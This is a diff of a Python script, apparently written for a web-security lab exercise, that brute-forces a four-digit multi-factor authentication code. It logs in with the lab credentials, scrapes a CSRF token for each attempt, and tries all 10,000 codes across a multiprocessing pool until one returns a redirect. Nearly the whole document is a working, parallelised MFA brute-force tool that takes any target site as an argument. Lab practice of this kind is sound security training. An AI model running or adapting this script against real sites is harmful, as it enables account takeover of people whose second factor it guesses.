@@ -1,4 +1,4 @@
-import sys, requests, multiprocessing, time
+import sys, requests, multiprocessing
 from bs4 import BeautifulSoup
 
 site = sys.argv[1]
@@ -12,38 +12,26 @@ login_url = f'https://{site}/login'
 login2_url = f'https://{site}/login2'
 
 
-multiCPUProc = 5
-countCPU = multiprocessing.cpu_count() - 1
-
-#Taken from getUrls_multiprocessing.py and adapted for this functionality
-def time_decorator(func):
-  """
-  Takes a function and returns a version of it that prints out the elapsed time for executing it
-  :param func: Function to decorate
-  :return: Function which outputs execution time
-  :rtype: Function
-  """
-  def inner(*args, **kwargs):
-      s = time.perf_counter()
-      return_vals = func(*args, **kwargs)
-      elapsed = time.perf_counter() - s
-      print(f'Function returned: {return_vals}')
-      return(elapsed)
-  return(inner)
-  
 
 #Does the bascic login functionality that was given in Code labs
 def login_user(s):
-    resp = s.get(login_url)
-    soup = BeautifulSoup(resp.text, 'html.parser')
-    csrf = soup.find('input', {'name':'csrf'}).get('value')
+    #Takes in the argument of a session request 
 
+    #Performs a scrape for the CSRF 
+    try:
+        resp = s.get(login_url)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        csrf = soup.find('input', {'name':'csrf'}).get('value')
+    except:
+        print('Unable to login')
+        
     logindata = {
     'csrf' : csrf,
     'username' : 'carlos',
     'password' : 'montoya'
     }
     
+    #Performs basic login for the user
     # print(f'Logging in as carlos:montoya')
     resp = s.post(login_url, data=logindata)
     soup = BeautifulSoup(resp.text, 'html.parser')
@@ -52,27 +40,65 @@ def login_user(s):
 
     return csrf
 
-#Checks if the Auth Code given from get_multi is correct or not. If it is not correct than it tries the next code
-def attack_auth():
-    s = requests.Session()
-    
-    for i in range(0, 10000):
-        csrf = login_user(s)
+#The function used to brute force/check request for the auth code
+#Takes in the authentication code to test as well as the event handler which is in charge of ending the program
+def multi_attack_auth(attack_vector, event):
 
+    #If event is not set, then keep running
+    if not event.is_set():
+
+        #create new session to collect new csrf
+        s = requests.Session()
+
+        csrf = login_user(s)
         login2data = {
             'csrf' : csrf,
-            'mfa-code' : str(i).zfill(4)
+            'mfa-code' : attack_vector
         }
 
-        resp = s.post(login2_url, data=login2data, allow_redirects=False)
-        if resp.status_code == 200:
-            print(f'{str(i).zfill(4) } || {resp.status_code}')
-        if resp.status_code == 302:
-            print(f'{str(i).zfill(4) } || {resp.status_code}')
+        #Test new authetication code to see if it returns a 302(valid) response.
+        try:
+            resp = s.post(login2_url, data=login2data, allow_redirects=False)
+            if resp.status_code == 302:
+                print(f' ===== {attack_vector } || {resp.status_code} =====')
+                event.set()
+                
+            if resp.status_code == 200:
+                print(f'{attack_vector} || {resp.status_code}')
+        except:
+            print('Not able to properly test auth codes')
             
 
+def main():
+    #Counts the CPU's present on the system
+    cpu_count = multiprocessing.cpu_count()
 
+    #Creates a Pool that creates processes equal to the amount of cpu cores 
+    pool = multiprocessing.Pool(cpu_count)
+
+    #The procManager is in charge of controlling if the program should continue running
+    #Read the following article to get this to work:
+    #https://code.luasoftware.com/tutorials/python/python-multiprocess-continue-running-until-stop-signal/
+    procManager = multiprocessing.Manager()
+    event = procManager.Event()
+
+    #Generates the atttack vectors to check
+    attack_vector = []
+    for i in range(0, 10000):
+        attack_vector.append('%04d' % i)
+
+    #Maps the vectors equally across the Pool
+    for i in range(10000):
+        pool.apply_async(multi_attack_auth, (attack_vector[i], event))
+    pool.close()
+
+    event.wait()
+    pool.terminate()
+
+#Runs the program
 if __name__ == '__main__':
-    attack_auth()
+    # multi_attack_auth()
+    main()
+
 
     
